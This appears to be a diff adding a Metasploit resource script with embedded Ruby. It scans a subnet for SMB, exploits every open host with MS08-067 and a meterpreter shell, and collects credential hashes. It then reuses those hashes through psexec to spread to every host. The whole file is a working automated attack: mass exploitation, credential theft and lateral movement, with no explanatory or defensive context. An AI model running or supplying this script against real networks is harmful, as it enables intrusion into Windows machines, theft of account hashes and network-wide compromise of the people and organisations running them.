@@ -1,0 +1,71 @@
+db_driver mysql
+db_destroy metasploit@localhost/metasploit
+db_connect metasploit@localhost/metasploit
+
+db_nmap -n -T5 -p 445 10.11.251.0/24
+
+<ruby>
+	MAX_JOBS = 5
+
+	framework.db.services.each do |service|
+		if service.port == 445 && service.state = 'open'
+			puts "Attacking #{service.host.address}"
+			self.run_single("use exploit/windows/smb/ms08_067_netapi")
+			self.run_single("set PAYLOAD windows/meterpreter/bind_tcp")
+			self.run_single("set RHOST #{service.host.address}")
+			self.run_single("set AutoRunScript post/windows/gather/credential_collector")
+
+			while framework.jobs.size >= MAX_JOBS
+				::IO.select(nil, nil, nil, 0.25)
+			end
+
+			self.run_single("exploit -j")
+		end
+	end
+
+	while framework.jobs.size > 0
+		::IO.select(nil, nil, nil, 0.25)
+	end
+
+	creds = {}
+
+	framework.db.each_cred do |cred|
+		if cred.ptype == 'smb_hash'
+			if cred.user =~ /\$/
+				next
+			elsif cred.user =~ /Guest/i
+				next
+			elsif cred.user =~ /HelpAssistant/
+				next
+			elsif cred.user =~ /SUPPORT_/
+				next
+			else
+				creds[cred.user] = [] unless creds[cred.user]
+				creds[cred.user] << cred.pass
+			end
+		end
+	end
+		
+	creds.each {|u,c| c.uniq!}
+	
+	framework.db.services.each do |service|
+		if service.port == 445 && service.state == 'open'
+			creds.each do |user, hashes|
+				hashes.each do |hash|
+					self.run_single("use exploit/windows/smb/psexec")
+					self.run_single("set PAYLOAD windows/meterpreter/bind_tcp")
+					self.run_single("set RHOST #{service.host.address}")
+					self.run_single("set SMBUser #{user}")
+					self.run_single("set SMBPass #{hash}")
+					self.run_single("set AutoRunScript post/windows/gather/credential_collector")
+
+					while framework.jobs.size >= MAX_JOBS
+						::IO.select(nil, nil, nil, 0.25)
+					end
+
+					self.run_single("exploit -j")
+				end
+			end
+		end
+	end
+</ruby>
